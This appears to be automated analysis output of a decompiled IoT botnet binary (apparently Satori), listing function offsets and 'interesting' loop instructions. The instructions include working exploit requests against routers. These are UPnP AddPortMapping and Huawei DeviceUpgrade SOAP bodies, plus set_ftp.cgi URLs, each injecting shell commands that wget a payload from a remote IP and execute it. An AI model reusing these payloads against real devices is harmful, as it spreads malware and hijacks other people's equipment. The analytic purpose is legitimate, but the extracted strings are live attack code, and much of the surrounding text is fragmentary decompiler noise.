+                                                                                    function_404b90(v347, (int32_t)"POST /picdesc.xml HTTP/1.1\r\nHost: 127.0.0.1:52869\r\nContent-Length: 620\r\nAccept-Encoding: gzip, deflate\r\nSOAPAction: urn:schemas-upnp-org:service:WANIPConnection:1#AddPortMapping\r\nAccept: */*\r\nUser-Agent: Hello-World\r\nConnection: keep-alive\r\n\r\n<?xml version=\"1.0\" ?><s:Envelope xmlns:s=\"http://schemas.xmlsoap.org/soap/envelope/\" s:encodingStyle=\"http://schemas.xmlsoap.org/soap/encoding/\"><s:Body><u:AddPortMapping xmlns:u=\"urn:schemas-upnp-org:service:WANIPConnection:1\"><NewRemoteHost></NewRemoteHost><NewExternalPort>47450</NewExternalPort><NewProtocol>TCP</NewProtocol><NewInternalPort>44382</NewInternalPort><NewInternalClient>`cd /var;cp $SHELL %s;>%s`</NewInternalClient><NewEnabled>1</NewEnabled><NewPortMappingDescription>syncthing</NewPortMappingDescription><NewLeaseDuration>0</NewLeaseDuration></u:AddPortMapping></s:Body></s:Envelope>\r\n\r\n", v364);
+                                                                                    function_404b90(v347, (int32_t)"POST /picdesc.xml HTTP/1.1\r\nHost: 127.0.0.1:52869\r\nContent-Length: 642\r\nAccept-Encoding: gzip, deflate\r\nSOAPAction: urn:schemas-upnp-org:service:WANIPConnection:1#AddPortMapping\r\nAccept: */*\r\nUser-Agent: Hello-World\r\nConnection: keep-alive\r\n\r\n<?xml version=\"1.0\" ?><s:Envelope xmlns:s=\"http://schemas.xmlsoap.org/soap/envelope/\" s:encodingStyle=\"http://schemas.xmlsoap.org/soap/encoding/\"><s:Body><u:AddPortMapping xmlns:u=\"urn:schemas-upnp-org:service:WANIPConnection:1\"><NewRemoteHost></NewRemoteHost><NewExternalPort>47450</NewExternalPort><NewProtocol>TCP</NewProtocol><NewInternalPort>44382</NewInternalPort><NewInternalClient>`cd /var;wget http://%d.%d.%d.%d/mips.satori -O -> %s`</NewInternalClient><NewEnabled>1</NewEnabled><NewPortMappingDescription>syncthing</NewPortMappingDescription><NewLeaseDuration>0</NewLeaseDuration></u:AddPortMapping></s:Body></s:Envelope>\r\n\r\n", 185);
+                                                                        while (true) {
+                                                                        while (true) {
+                                                                                    function_403fcc((char *)&v281, (int32_t)"GET /set_ftp.cgi?loginuse=");
+                                                                                    function_403f6c((char *)&v281, (int32_t)"&next_url=ftp.htm&port=21&user=ftp&pwd=ftp&dir=/&mode=PORT&upload_interval=0&svr=%24%28");
+                                                                                    while (true) {
+                                                                                            function_403f6c((char *)&v281, (int32_t)"%29 HTTP/1.0\r\n\r\n");
+                                                                                            function_403fcc((char *)&v281, (int32_t)"GET /ftptest.cgi?loginuse=");
+                                                                                            function_403f6c((char *)&v281, (int32_t)" HTTP/1.0\r\n\r\n");
+                                                                                            function_404b90(v383, (int32_t)"POST /ctrlt/DeviceUpgrade_1 HTTP/1.1\r\nHost: 127.0.0.1:37215\r\nUser-Agent: Hello-World\r\nContent-Length: 413\r\nConnection: keep-alive\r\nAccept: */*\r\nAccept-Encoding: gzip, deflate\r\nAuthorization: Digest username=\"dslf-config\", realm=\"HuaweiHomeGateway\", nonce=\"88645cefb1f9ede0e336e3569d75ee30\", uri=\"/ctrlt/DeviceUpgrade_1\", response=\"3612f843a42db38f48f59d2a3597e19c\", algorithm=\"MD5\", qop=\"auth\", nc=00000001, cnonce=\"248d1a2560100669\"\r\n\r\n<?xml version=\"1.0\" ?>\r\n    <s:Envelope xmlns:s=\"http://schemas.xmlsoap.org/soap/envelope/\" s:encodingStyle=\"http://schemas.xmlsoap.org/soap/encoding/\">\r\n    <s:Body><u:Upgrade xmlns:u=\"urn:schemas-upnp-org:service:WANPPPConnection:1\">\r\n    <NewStatusURL>$(/bin/busybox wget -g %d.%d.%d.%d -l /tmp/.f -r /g/h;sh /tmp/.f)</NewStatusURL>\r\n<NewDownloadURL></NewDownloadURL>\r\n</u:Upgrade>\r\n    </s:Body>\r\n    </s:Envelope>\r\n\r\n", 185);
+                                                                                        function_403f6c((char *)&v281, (int32_t)"%29 HTTP/1.0\r\n\r\n");
+                while (true) {
+=================FUNCTION : function_401f28 ===================
+++++++++ FUNCTION START 5280
+++++++++ FUNCTION END 6234
+++++++++ FUNCTION LENGTH 954
+    while (true) {
+            while (true) {
+                    if (function_405cb0(v296, (struct sockaddr *)&v272) != v265) {
+                                                    while (true) {
+                                        while (true) {
+                                    while (true) {
+        if (function_405cb0(v296, (struct sockaddr *)&v272) != v265) {
+                                        while (true) {
+                                while (true) {
+=================FUNCTION : function_4058c0 ===================
+++++++++ FUNCTION START 22928
+++++++++ FUNCTION END 23492
+++++++++ FUNCTION LENGTH 564
+                    case -2: {
+                    case -1: {
+                        while (true) {
+                case -2: {
+                case -1: {
+                    while (true) {
+=================FUNCTION : function_400a30 ===================
+++++++++ FUNCTION START 3018
+++++++++ FUNCTION END 3610
+++++++++ FUNCTION LENGTH 592
+        while (true) {
+    while (true) {
+    while (true) {
+        while (true) {
+                            while (true) {
+=================FUNCTION : function_401304 ===================
+++++++++ FUNCTION START 3613
+++++++++ FUNCTION END 3964
+++++++++ FUNCTION LENGTH 351
+            function_405cb0(v255, (struct sockaddr *)16);
+    if (function_405c50(v251, (struct sockaddr *)&v258, 16) == 0) {
+            function_405cb0(v255, (struct sockaddr *)16);
+                function_405cb0(v255, (struct sockaddr *)16);
+                function_405cb0(v255, (struct sockaddr *)16);
+=================FUNCTION : function_404660 ===================
+++++++++ FUNCTION START 14286
+++++++++ FUNCTION END 14695
+++++++++ FUNCTION LENGTH 409
+            while (true) {
+        while (true) {
+    while (true) {
+=================FUNCTION : function_401520 ===================
+++++++++ FUNCTION START 3967
+++++++++ FUNCTION END 4489
+++++++++ FUNCTION LENGTH 522
+    while (true) {
+        while (true) {
+                function_405cb0(v278, (struct sockaddr *)&v277);
+=================FUNCTION : function_40405c ===================
+++++++++ FUNCTION START 11529
+++++++++ FUNCTION END 11962
+++++++++ FUNCTION LENGTH 433
+            while (true) {
+        while (true) {
+    while (true) {
+=================FUNCTION : function_4047b0 ===================
+++++++++ FUNCTION START 14698
+++++++++ FUNCTION END 15051
+++++++++ FUNCTION LENGTH 353
+        while (true) {
+    while (true) {
+=================FUNCTION : function_405f30 ===================
+++++++++ FUNCTION START 25631
+++++++++ FUNCTION END 25894
+++++++++ FUNCTION LENGTH 263
+    int32_t v251 = send(sock, buf, length, flags); // 0x405f50
+    if (flags != 0) {
+=================FUNCTION : function_4002d0 ===================
+++++++++ FUNCTION START 1300
+++++++++ FUNCTION END 1617
+++++++++ FUNCTION LENGTH 317
+    while (true) {
+                while (true) {
+=================FUNCTION : function_403d2c ===================
+++++++++ FUNCTION START 9319
+++++++++ FUNCTION END 9656
+++++++++ FUNCTION LENGTH 337
+    while (true) {
+        while (true) {
+=================FUNCTION : function_400418 ===================
+++++++++ FUNCTION START 1620
+++++++++ FUNCTION END 1939
+++++++++ FUNCTION LENGTH 319
+    while (true) {
+                while (true) {
+=================FUNCTION : function_405bf0 ===================
+++++++++ FUNCTION START 23495
+++++++++ FUNCTION END 23758
+++++++++ FUNCTION LENGTH 263
+    int32_t accepted_sock_fd = accept(sock, addr, (int32_t *)addr_len); // 0x405c10
+        result = accepted_sock_fd;
+=================FUNCTION : function_406010 ===================
+++++++++ FUNCTION START 26163
+++++++++ FUNCTION END 26427
+++++++++ FUNCTION LENGTH 264
+    int32_t sock_fd = socket(domain, type, protocol); // 0x406030
+        result = sock_fd;
+=================FUNCTION : function_405e50 ===================
+++++++++ FUNCTION START 25099
+++++++++ FUNCTION END 25362
+++++++++ FUNCTION LENGTH 263
+    int32_t v251 = recv(sock, buf, length, flags); // 0x405e70
+    if (flags != 0) {
+=================FUNCTION : function_405eb0 ===================
+++++++++ FUNCTION START 25365
+++++++++ FUNCTION END 25628
+++++++++ FUNCTION LENGTH 263
+    int32_t v251 = recvfrom(sock, buf, length, flags, NULL, NULL); // 0x405ef0
+    if (flags != 0) {
+=================FUNCTION : function_40450c ===================
+++++++++ FUNCTION START 13754
+++++++++ FUNCTION END 14021
+++++++++ FUNCTION LENGTH 267
+        function_405cb0(v252, (struct sockaddr *)&v253);
+        function_405d10(v252, (struct sockaddr *)&v253, (int32_t)&v251);
+=================FUNCTION : function_406640 ===================
+++++++++ FUNCTION START 28505
+++++++++ FUNCTION END 28809
+++++++++ FUNCTION LENGTH 304
+    while (true) {
+=================FUNCTION : function_404be4 ===================
+++++++++ FUNCTION START 15727
+++++++++ FUNCTION END 16038
+++++++++ FUNCTION LENGTH 311
+    while (true) {
+=================FUNCTION : function_407960 ===================
+++++++++ FUNCTION START 35535
+++++++++ FUNCTION END 35799
+++++++++ FUNCTION LENGTH 264
+    int32_t v251 = getuid(); // 0x407980
+=================FUNCTION : function_40413c ===================
+++++++++ FUNCTION START 11965
+++++++++ FUNCTION END 12263
+++++++++ FUNCTION LENGTH 298
+        while (true) {
+=================FUNCTION : function_405cb0 ===================
+++++++++ FUNCTION START 24028
+++++++++ FUNCTION END 24294
+++++++++ FUNCTION LENGTH 266
+    int32_t v251 = connect(sock, addr, addr_len); // 0x405cd0
+=================FUNCTION : function_404ef0 ===================
+++++++++ FUNCTION START 17647
+++++++++ FUNCTION END 17911
+++++++++ FUNCTION LENGTH 264
+    int32_t pid = getpid(); // 0x404f10
+=================FUNCTION : function_4056a0 ===================
+++++++++ FUNCTION START 21731
+++++++++ FUNCTION END 22024
+++++++++ FUNCTION LENGTH 293
+    while (true) {
+=================FUNCTION : function_404f50 ===================
+++++++++ FUNCTION START 17914
+++++++++ FUNCTION END 18178
+++++++++ FUNCTION LENGTH 264
+    int32_t ppid = getppid(); // 0x404f70
+=================FUNCTION : function_4024d4 ===================
+++++++++ FUNCTION START 6237
+++++++++ FUNCTION END 6528
+++++++++ FUNCTION LENGTH 291
+    while (true) {
+=================FUNCTION : function_405d70 ===================
+++++++++ FUNCTION START 24564
+++++++++ FUNCTION END 24829
+++++++++ FUNCTION LENGTH 265
+    int32_t v251 = getsockopt(sock, level, option_name, (int32_t *)option_value, NULL); // 0x405da8
+=================FUNCTION : function_4043f4 ===================
+++++++++ FUNCTION START 13194
+++++++++ FUNCTION END 13495
+++++++++ FUNCTION LENGTH 301
+    while (true) {
+=================FUNCTION : function_407490 ===================
+++++++++ FUNCTION START 33338
+++++++++ FUNCTION END 33602
+++++++++ FUNCTION LENGTH 264
+    int32_t v250 = sys_clock_getres(a1, a2); // 0x4074b0
+=================FUNCTION : function_405c50 ===================
+++++++++ FUNCTION START 23761
+++++++++ FUNCTION END 24025
+++++++++ FUNCTION LENGTH 264
+    int32_t v251 = bind(sock, addr, addr_len); // 0x405c70
+=================FUNCTION : function_407810 ===================
+++++++++ FUNCTION START 34478
+++++++++ FUNCTION END 34742
+++++++++ FUNCTION LENGTH 264
+    int32_t v251 = getegid(); // 0x407830
+=================FUNCTION : function_400564 ===================
+++++++++ FUNCTION START 1942
+++++++++ FUNCTION END 2213
+++++++++ FUNCTION LENGTH 271
+    while (true) {
+=================FUNCTION : function_4078d0 ===================
+++++++++ FUNCTION START 35012
+++++++++ FUNCTION END 35276
+++++++++ FUNCTION LENGTH 264
+    int32_t v251 = getgid(); // 0x4078f0
+=================FUNCTION : function_405d10 ===================
+++++++++ FUNCTION START 24297
+++++++++ FUNCTION END 24561
+++++++++ FUNCTION LENGTH 264
+    int32_t v251 = getsockname(sock, addr, (int32_t *)addr_len); // 0x405d30
+=================FUNCTION : function_404920 ===================
+++++++++ FUNCTION START 15054
+++++++++ FUNCTION END 15468
+++++++++ FUNCTION LENGTH 414
+    while (true) {
+=================FUNCTION : function_405070 ===================
+++++++++ FUNCTION START 18715
+++++++++ FUNCTION END 18985
+++++++++ FUNCTION LENGTH 270
+    int32_t fd = open(path, oflag); // 0x4050b4
+=================FUNCTION : function_405df0 ===================
+++++++++ FUNCTION START 24832
+++++++++ FUNCTION END 25096
+++++++++ FUNCTION LENGTH 264
+    int32_t v251 = listen(sock, backlog); // 0x405e10
+=================FUNCTION : function_404fb0 ===================
+++++++++ FUNCTION START 18181
+++++++++ FUNCTION END 18445
+++++++++ FUNCTION LENGTH 264
+    int32_t v251 = getrlimit(resource, rlp); // 0x404fd0
+=================FUNCTION : function_404de0 ===================
+++++++++ FUNCTION START 16851
+++++++++ FUNCTION END 17115
+++++++++ FUNCTION LENGTH 264
+    int32_t v251 = close(fd); // 0x404e00
+=================FUNCTION : function_405010 ===================
+++++++++ FUNCTION START 18448
+++++++++ FUNCTION END 18712
+++++++++ FUNCTION LENGTH 264
+    int32_t v251 = kill(pid, sig_num); // 0x405030
+=================FUNCTION : function_404228 ===================
+++++++++ FUNCTION START 12266
+++++++++ FUNCTION END 12556
+++++++++ FUNCTION LENGTH 290
+    while (true) {
+=================FUNCTION : function_407870 ===================
+++++++++ FUNCTION START 34745
+++++++++ FUNCTION END 35009
+++++++++ FUNCTION LENGTH 264
+    int32_t v251 = geteuid(); // 0x407890
+=================FUNCTION : function_407b60 ===================
+++++++++ FUNCTION START 36636
+++++++++ FUNCTION END 36914
+++++++++ FUNCTION LENGTH 278
+    int32_t v251 = sigprocmask(how, set, (struct _TYPEDEF_sigset_t *)oset); // 0x407bb8
+=================FUNCTION : function_406f88 ===================
+++++++++ FUNCTION START 31946
+++++++++ FUNCTION END 32537
+++++++++ FUNCTION LENGTH 591
+    while (true) {
+=================FUNCTION : function_407640 ===================
+++++++++ FUNCTION START 34158
+++++++++ FUNCTION END 34475
+++++++++ FUNCTION LENGTH 317
+    while (true) {
+=================FUNCTION : function_407ea0 ===================
+++++++++ FUNCTION START 37700
+++++++++ FUNCTION END 38213
+++++++++ FUNCTION LENGTH 513
+        while (true) {
+=================FUNCTION : function_404e40 ===================
+++++++++ FUNCTION START 17118
+++++++++ FUNCTION END 17382
+++++++++ FUNCTION LENGTH 264
+    int32_t v251 = fork(); // 0x404e60
+=================FUNCTION : function_405f90 ===================
+++++++++ FUNCTION START 25897
+++++++++ FUNCTION END 26160
+++++++++ FUNCTION LENGTH 263
+    int32_t v251 = setsockopt(sock, level, option_name, option_value, 0); // 0x405fc8
+================================================================================
+========	WHILE LOOPS INTRESTING INSTRUCTIONS : =================================
+================================================================================
+=============================WHILE LOOPS ID : 1 @ function_4002d0 ====================================
+++++++++ WHILE START : 1554 
+++++++++ WHILE FUNCTION : function_4002d0 
+++++++++ WHILE END : 1612 
+++++++++ INTRESTING INSTRUCTIONS :  
+		while (true) {
+=============================WHILE LOOPS ID : 2 @ function_400418 ====================================
+++++++++ WHILE START : 1873 
+++++++++ WHILE FUNCTION : function_400418 
+++++++++ WHILE END : 1934 
+++++++++ INTRESTING INSTRUCTIONS :  
+		while (true) {
+=============================WHILE LOOPS ID : 6 @ function_400a30 ====================================
+++++++++ WHILE START : 3443 
+++++++++ WHILE FUNCTION : function_400a30 
+++++++++ WHILE END : 3609 
+++++++++ INTRESTING INSTRUCTIONS :  
+		while (true) {
+		while (true) {
+=============================WHILE LOOPS ID : 7 @ function_401520 ====================================
+++++++++ WHILE START : 4273 
+++++++++ WHILE FUNCTION : function_401520 
+++++++++ WHILE END : 4468 
+++++++++ INTRESTING INSTRUCTIONS :  
+		while (true) {
+		function_405cb0(v278, (struct sockaddr *)&v277);
+=============================WHILE LOOPS ID : 8 @ function_401f28 ====================================
+++++++++ WHILE START : 5542 
+++++++++ WHILE FUNCTION : function_401f28 
+++++++++ WHILE END : 6233 
+++++++++ INTRESTING INSTRUCTIONS :  
+		while (true) {
+		if (function_405cb0(v296, (struct sockaddr *)&v272) != v265) {
+		while (true) {
+		while (true) {
+		while (true) {
+		if (function_405cb0(v296, (struct sockaddr *)&v272) != v265) {
+		while (true) {
+		while (true) {
+=============================WHILE LOOPS ID : 10 @ function_4028e8 ====================================
+++++++++ WHILE START : 8022 
+++++++++ WHILE FUNCTION : function_4028e8 
+++++++++ WHILE END : 8643 
+++++++++ INTRESTING INSTRUCTIONS :  
+		if (function_405cb0(v315, (struct sockaddr *)&v312) == -1) {
+		while (true) {
+		function_404b90(v348, (int32_t)"POST /picdesc.xml HTTP/1.1\r\nHost: 127.0.0.1:52869\r\nContent-Length: 620\r\nAccept-Encoding: gzip, deflate\r\nSOAPAction: urn:schemas-upnp-org:service:WANIPConnection:1#AddPortMapping\r\nAccept: */*\r\nUser-Agent: Hello-World\r\nConnection: keep-alive\r\n\r\n<?xml version=\"1.0\" ?><s:Envelope xmlns:s=\"http://schemas.xmlsoap.org/soap/envelope/\" s:encodingStyle=\"http://schemas.xmlsoap.org/soap/encoding/\"><s:Body><u:AddPortMapping xmlns:u=\"urn:schemas-upnp-org:service:WANIPConnection:1\"><NewRemoteHost></NewRemoteHost><NewExternalPort>47450</NewExternalPort><NewProtocol>TCP</NewProtocol><NewInternalPort>44382</NewInternalPort><NewInternalClient>`cd /var;chmod +x %s;./%s`</NewInternalClient><NewEnabled>1</NewEnabled><NewPortMappingDescription>syncthing</NewPortMappingDescription><NewLeaseDuration>0</NewLeaseDuration></u:AddPortMapping></s:Body></s:Envelope>\r\n\r\n", v355);
+		function_404b90(v347, (int32_t)"POST /picdesc.xml HTTP/1.1\r\nHost: 127.0.0.1:52869\r\nContent-Length: 620\r\nAccept-Encoding: gzip, deflate\r\nSOAPAction: urn:schemas-upnp-org:service:WANIPConnection:1#AddPortMapping\r\nAccept: */*\r\nUser-Agent: Hello-World\r\nConnection: keep-alive\r\n\r\n<?xml version=\"1.0\" ?><s:Envelope xmlns:s=\"http://schemas.xmlsoap.org/soap/envelope/\" s:encodingStyle=\"http://schemas.xmlsoap.org/soap/encoding/\"><s:Body><u:AddPortMapping xmlns:u=\"urn:schemas-upnp-org:service:WANIPConnection:1\"><NewRemoteHost></NewRemoteHost><NewExternalPort>47450</NewExternalPort><NewProtocol>TCP</NewProtocol><NewInternalPort>44382</NewInternalPort><NewInternalClient>`cd /var;cp $SHELL %s;>%s`</NewInternalClient><NewEnabled>1</NewEnabled><NewPortMappingDescription>syncthing</NewPortMappingDescription><NewLeaseDuration>0</NewLeaseDuration></u:AddPortMapping></s:Body></s:Envelope>\r\n\r\n", v364);
+		function_404b90(v347, (int32_t)"POST /picdesc.xml HTTP/1.1\r\nHost: 127.0.0.1:52869\r\nContent-Length: 642\r\nAccept-Encoding: gzip, deflate\r\nSOAPAction: urn:schemas-upnp-org:service:WANIPConnection:1#AddPortMapping\r\nAccept: */*\r\nUser-Agent: Hello-World\r\nConnection: keep-alive\r\n\r\n<?xml version=\"1.0\" ?><s:Envelope xmlns:s=\"http://schemas.xmlsoap.org/soap/envelope/\" s:encodingStyle=\"http://schemas.xmlsoap.org/soap/encoding/\"><s:Body><u:AddPortMapping xmlns:u=\"urn:schemas-upnp-org:service:WANIPConnection:1\"><NewRemoteHost></NewRemoteHost><NewExternalPort>47450</NewExternalPort><NewProtocol>TCP</NewProtocol><NewInternalPort>44382</NewInternalPort><NewInternalClient>`cd /var;wget http://%d.%d.%d.%d/mips.satori -O -> %s`</NewInternalClient><NewEnabled>1</NewEnabled><NewPortMappingDescription>syncthing</NewPortMappingDescription><NewLeaseDuration>0</NewLeaseDuration></u:AddPortMapping></s:Body></s:Envelope>\r\n\r\n", 185);
+		while (true) {
+		while (true) {
+		function_403fcc((char *)&v281, (int32_t)"GET /set_ftp.cgi?loginuse=");
+		function_403f6c((char *)&v281, (int32_t)"&next_url=ftp.htm&port=21&user=ftp&pwd=ftp&dir=/&mode=PORT&upload_interval=0&svr=%24%28");
+		while (true) {
+		function_403f6c((char *)&v281, (int32_t)"%29 HTTP/1.0\r\n\r\n");
+		function_403fcc((char *)&v281, (int32_t)"GET /ftptest.cgi?loginuse=");
+		function_403f6c((char *)&v281, (int32_t)" HTTP/1.0\r\n\r\n");
+		function_404b90(v383, (int32_t)"POST /ctrlt/DeviceUpgrade_1 HTTP/1.1\r\nHost: 127.0.0.1:37215\r\nUser-Agent: Hello-World\r\nContent-Length: 413\r\nConnection: keep-alive\r\nAccept: */*\r\nAccept-Encoding: gzip, deflate\r\nAuthorization: Digest username=\"dslf-config\", realm=\"HuaweiHomeGateway\", nonce=\"88645cefb1f9ede0e336e3569d75ee30\", uri=\"/ctrlt/DeviceUpgrade_1\", response=\"3612f843a42db38f48f59d2a3597e19c\", algorithm=\"MD5\", qop=\"auth\", nc=00000001, cnonce=\"248d1a2560100669\"\r\n\r\n<?xml version=\"1.0\" ?>\r\n    <s:Envelope xmlns:s=\"http://schemas.xmlsoap.org/soap/envelope/\" s:encodingStyle=\"http://schemas.xmlsoap.org/soap/encoding/\">\r\n    <s:Body><u:Upgrade xmlns:u=\"urn:schemas-upnp-org:service:WANPPPConnection:1\">\r\n    <NewStatusURL>$(/bin/busybox wget -g %d.%d.%d.%d -l /tmp/.f -r /g/h;sh /tmp/.f)</NewStatusURL>\r\n<NewDownloadURL></NewDownloadURL>\r\n</u:Upgrade>\r\n    </s:Body>\r\n    </s:Envelope>\r\n\r\n", 185);
+		function_403f6c((char *)&v281, (int32_t)"%29 HTTP/1.0\r\n\r\n");
+=============================WHILE LOOPS ID : 13 @ function_403d2c ====================================
+++++++++ WHILE START : 9576 
+++++++++ WHILE FUNCTION : function_403d2c 
+++++++++ WHILE END : 9655 
+++++++++ INTRESTING INSTRUCTIONS :  
+		while (true) {
+=============================WHILE LOOPS ID : 19 @ function_404288 ====================================
+++++++++ WHILE START : 12811 
+++++++++ WHILE FUNCTION : function_404288 
+++++++++ WHILE END : 13190 
+++++++++ INTRESTING INSTRUCTIONS :  
+		case 32: {
+		while (true) {
+		case 32: {
+		while (true) {
+		case 32: {
+		while (true) {
+		case 32: {
+		while (true) {
+		case 32: {
+		while (true) {
+		case 32: {
+		while (true) {
+		case 32: {
+		while (true) {
+		case 32: {
+		while (true) {
+		case 32: {
+		while (true) {
+		case 32: {
+		while (true) {
+		case 32: {
+		while (true) {
+		case 32: {
+		while (true) {
+		case 32: {
+		while (true) {
+		case 32: {
+		while (true) {
+		case 32: {
+		while (true) {
+		case 32: {
+		while (true) {
+		case 32: {
+		while (true) {
+		case 32: {
+		while (true) {
+		case 32: {
+		while (true) {
+		case 32: {
+		while (true) {
+		case 32: {
+		while (true) {
+		case 32: {
+		while (true) {
+		case 32: {
+		while (true) {
+		case 32: {
+		while (true) {
+		case 32: {
+		case 9: {
+		case 9: {
+		case 9: {
+		case 9: {
+		case 9: {
+		case 9: {
+		case 9: {
+		case 9: {
+		case 9: {
+		case 9: {
+		case 9: {
+		case 9: {
+		case 9: {
+		case 9: {
+		case 9: {
+		case 9: {
+		case 9: {
+		case 9: {
+		case 9: {
+		case 9: {
+		case 9: {
+		case 9: {
+		case 9: {
+		case 9: {
+		case 9: {
